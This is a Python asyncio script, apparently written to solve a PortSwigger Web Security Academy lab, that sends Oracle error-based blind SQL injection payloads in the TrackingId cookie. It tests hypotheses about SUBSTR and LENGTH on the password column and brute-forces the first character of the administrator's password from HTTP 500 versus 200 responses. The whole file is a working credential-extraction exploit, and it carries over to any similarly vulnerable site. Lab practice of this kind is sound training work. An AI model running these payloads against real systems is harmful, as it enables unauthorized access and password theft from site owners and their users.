import asyncio
import aiohttp

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"
FILTER_URL = BASE_URL + "/filter"

async def payload_test(session: aiohttp.ClientSession, payload: str) -> int:
    """測試 payload 並返回狀態碼"""
    print(f"Testing: {payload}")
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    
    try:
        async with session.get(FILTER_URL, params={"category": "Pets"}, cookies=cookies, timeout=10) as response:
            print(f"Result: {response.status}")
            return response.status
    except Exception as e:
        print(f"Error: {e}")
        return 0

async def test_password_field_hypothesis():
    """測試是否是 password 欄位特有的問題"""
    
    test_cases = [
        # 測試 1: 對其他欄位使用 SUBSTR（如果有的話）
        ("SUBSTR username", "SUBSTR(username,1,1)='a'"),
        ("SUBSTR username false", "SUBSTR(username,1,1)='z'"),
        
        # 測試 2: 對常量使用 SUBSTR vs 對 password 使用 SUBSTR
        ("SUBSTR 常量 true", "SUBSTR('test',1,1)='t'"),
        ("SUBSTR 常量 false", "SUBSTR('test',1,1)='x'"),
        ("SUBSTR password true?", "SUBSTR(password,1,1)='a'"),
        ("SUBSTR password false?", "SUBSTR(password,1,1)='z'"),
        
        # 測試 3: 不同的字串函數對 password 欄位的影響
        ("LENGTH password", "LENGTH(password)=5"),
        ("LENGTH password false", "LENGTH(password)=999"),
        
        # 測試 4: 嘗試不直接比較，而是檢查長度
        ("SUBSTR length check", "LENGTH(SUBSTR(password,1,1))=1"),
        ("SUBSTR length zero", "LENGTH(SUBSTR(password,1,1))=0"),
        
        # 測試 5: 使用 CASE 內的 CASE 來隔離問題
        ("Nested CASE", "CASE WHEN LENGTH(password)>0 THEN (CASE WHEN SUBSTR(password,1,1)='a' THEN 1 ELSE 0 END) ELSE 0 END=1"),
        
        # 測試 6: 先確定某個位置有值，再比較
        ("Safe SUBSTR with length check", "LENGTH(password)>=1 AND SUBSTR(password,1,1)='a'"),
        ("Safe SUBSTR false", "LENGTH(password)>=1 AND SUBSTR(password,1,1)='z'"),
    ]
    
    async with aiohttp.ClientSession() as session:
        print("=== 測試 password 欄位假設 ===\n")
        
        for name, condition in test_cases:
            payload = f"'||(SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            status = await payload_test(session, payload)
            
            # 分析預期結果
            if "false" in name.lower() or "zero" in name.lower():
                expected = "200"
                result = "✅" if status == 200 else "❌"
            elif "true" in name.lower() or name in ["LENGTH password", "SUBSTR length check", "Safe SUBSTR with length check"]:
                expected = "500" 
                result = "✅" if status == 500 else "❌"
            else:
                expected = "?"
                result = "🔍"
            
            print(f"{result} {name}: {status} (期望: {expected})")
            print("-" * 60)
            await asyncio.sleep(0.2)

async def test_working_sync_method():
    """嘗試重現同步版本的工作方式"""
    
    print("\n=== 嘗試重現同步工作方式 ===\n")
    
    # 基於您說同步版本能工作，讓我們測試具體的密碼字元
    # 假設密碼第一個字元是某些常見字元
    common_chars = "0123456789abcdef"
    
    async with aiohttp.ClientSession() as session:
        print("測試密碼第1個位置的每個可能字元：")
        
        found_chars = []
        for char in common_chars:
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,1,1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            status = await payload_test(session, payload)
            
            if status == 500:
                found_chars.append(char)
                print(f"✅ 可能的字元: '{char}'")
            else:
                print(f"❌ 不是: '{char}'")
            
            await asyncio.sleep(0.1)
        
        print(f"\n找到的可能字元: {found_chars}")
        
        if len(found_chars) == 1:
            print(f"🎉 第1個字元確定是: '{found_chars[0]}'")
        elif len(found_chars) > 1:
            print(f"⚠️  有多個匹配字元，可能有問題: {found_chars}")
        else:
            print("❌ 沒有找到任何匹配字元")

async def main():
    await test_password_field_hypothesis()
    await test_working_sync_method()

if __name__ == "__main__":
    asyncio.run(main())